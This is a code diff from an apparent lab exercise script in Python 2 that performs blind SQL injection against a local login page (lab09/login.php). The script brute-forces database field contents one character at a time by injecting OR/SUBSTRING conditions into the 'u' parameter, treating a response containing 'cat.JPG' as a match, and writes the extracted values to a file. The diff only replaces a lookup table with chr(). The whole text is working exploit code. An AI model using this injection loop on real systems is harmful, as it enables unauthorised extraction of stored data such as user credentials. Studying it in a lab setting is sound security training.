@@ -34,12 +34,12 @@ for row in xrange(1,101):
 		for pos in xrange(1,size+1):
 
 			for c in xrange(0,128):
-				request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20"+ str(row) +"%20AND%20SUBSTRING(" + str(field) + ","+ str(pos) +",1)%20=%20%27" + listASCII[c] + "%27%20--%20" 
+				request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20"+ str(row) +"%20AND%20SUBSTRING(" + str(field) + ","+ str(pos) +",1)%20=%20%27" + chr(c) + "%27%20--%20" 
 				f = urllib.urlopen(request)
 				response = f.read()
 				if (response.find('cat.JPG')!=-1): 
 					# print "found letter %s at position %d" %(listASCII[c],pos)
-					word += listASCII[c]
+					word += chr(c)
 					break
 		file.write(word)
 		file.write("     ")
